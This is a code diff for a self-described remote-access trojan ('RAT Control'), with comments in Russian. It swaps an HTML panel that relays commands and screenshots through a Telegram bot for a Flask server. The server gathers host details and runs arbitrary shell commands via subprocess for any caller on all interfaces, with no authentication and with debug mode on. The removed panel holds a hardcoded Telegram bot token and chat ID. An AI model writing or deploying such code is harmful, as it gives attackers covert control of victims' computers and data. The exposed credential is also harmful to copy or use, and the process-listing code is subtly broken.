@@ -1,83 +1,94 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>RAT Control</title>
-    <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-        button { padding: 15px; margin: 5px; background: #0088cc; color: white; border: none; border-radius: 10px; cursor: pointer; }
-        #output { background: white; padding: 20px; border-radius: 10px; margin-top: 20px; min-height: 200px; white-space: pre-wrap; }
-        #status { padding: 10px; margin: 10px 0; border-radius: 5px; }
-    </style>
-</head>
-<body>
-    <h1>🤖 RAT CONTROL</h1>
-    
-    <div id="status">✅ Готов</div>
-    
-    <button onclick="sendCommand('info')">📊 Информация</button>
-    <button onclick="sendCommand('screen')">📸 Скриншот</button>
-    <button onclick="sendCommand('processes')">📋 Процессы</button>
-    
-    <div id="output">Здесь появятся результаты...</div>
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import psutil
+import platform
+import socket
+import getpass
+import datetime
+import subprocess
+import os
 
-    <script>
-        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
-        const CHAT_ID = 7266658879;
-        let lastUpdateId = 0;
-        let lastCommandTime = 0;
+app = Flask(__name__)
+CORS(app)  # Разрешаем запросы с сайта
 
-        // Отправка команды
-        async function sendCommand(cmd) {
-            document.getElementById('status').innerHTML = '⏳ Отправка команды...';
-            document.getElementById('status').style.background = '#ffc107';
-            lastCommandTime = Date.now();
-            
-            // Отправляем команду
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: 'CMD:' + cmd  // Добавляем префикс CMD:
-                })
-            });
+# Корневая страница для проверки
+@app.route('/')
+def index():
+    return "✅ RAT Control Server is running!"
+
+# API для получения информации
+@app.route('/api/info', methods=['GET'])
+def get_info():
+    cpu = psutil.cpu_percent()
+    mem = psutil.virtual_memory()
+    disk = psutil.disk_usage('C:\\')
+    boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+    
+    return jsonify({
+        'success': True,
+        'data': {
+            'computer': platform.node(),
+            'user': getpass.getuser(),
+            'os': f"{platform.system()} {platform.release()}",
+            'boot': boot,
+            'cpu': cpu,
+            'ram_used': mem.used // 1024**3,
+            'ram_total': mem.total // 1024**3,
+            'ram_percent': mem.percent,
+            'disk_used': disk.used // 1024**3,
+            'disk_total': disk.total // 1024**3,
+            'disk_percent': disk.percent,
+            'ip': socket.gethostbyname(socket.gethostname())
         }
+    })
 
-        // Получение ответов
-        async function getUpdates() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
-                const data = await response.json();
-                
-                if (data.ok && data.result.length > 0) {
-                    data.result.forEach(update => {
-                        lastUpdateId = update.update_id;
-                        
-                        if (update.message && update.message.text) {
-                            const text = update.message.text;
-                            
-                            // Показываем ответ в окне
-                            if (text.startsWith('📊') || text.startsWith('📋') || text.startsWith('✅') || text.startsWith('❌')) {
-                                document.getElementById('output').innerHTML = text.replace(/\n/g, '<br>');
-                                document.getElementById('status').innerHTML = '✅ Получен ответ';
-                                document.getElementById('status').style.background = '#28a745';
-                            }
-                        }
-                        
-                        // Показываем фото
-                        if (update.message && update.message.photo) {
-                            document.getElementById('output').innerHTML = '📸 Скриншот отправлен в Telegram';
-                        }
-                    });
-                }
-            } catch (e) {
-                console.error('Ошибка:', e);
+# API для выполнения команд
+@app.route('/api/command', methods=['POST'])
+def run_command():
+    data = request.json
+    cmd = data.get('command', '')
+    
+    if cmd == 'info':
+        return get_info()
+    
+    elif cmd == 'cpu':
+        cpu_percent = psutil.cpu_percent(percpu=True)
+        freq = psutil.cpu_freq()
+        return jsonify({
+            'success': True,
+            'data': {
+                'cores': cpu_percent,
+                'freq': freq.current if freq else 0
             }
-        }
+        })
+    
+    elif cmd == 'processes':
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent'])[:20]:
+            processes.append({
+                'pid': proc.info['pid'],
+                'name': proc.info['name'],
+                'cpu': proc.info['cpu_percent']
+            })
+        return jsonify({'success': True, 'data': processes})
+    
+    else:
+        # Выполняем системную команду
+        try:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            return jsonify({
+                'success': True,
+                'output': result.stdout + result.stderr
+            })
+        except Exception as e:
+            return jsonify({'success': False, 'error': str(e)})
 
-        // Проверяем новые сообщения каждые 2 секунды
-        setInterval(getUpdates, 2000);
-    </script>
-</body>
-</html>
+if __name__ == '__main__':
+    print("="*60)
+    print("🚀 RAT CONTROL SERVER")
+    print("="*60)
+    print("✅ Сервер запущен!")
+    print(f"🌐 Локальный адрес: http://localhost:5000")
+    print(f"🌐 В сети адрес: http://{socket.gethostbyname(socket.gethostname())}:5000")
+    print("="*60)
+    app.run(host='0.0.0.0', port=5000, debug=True)
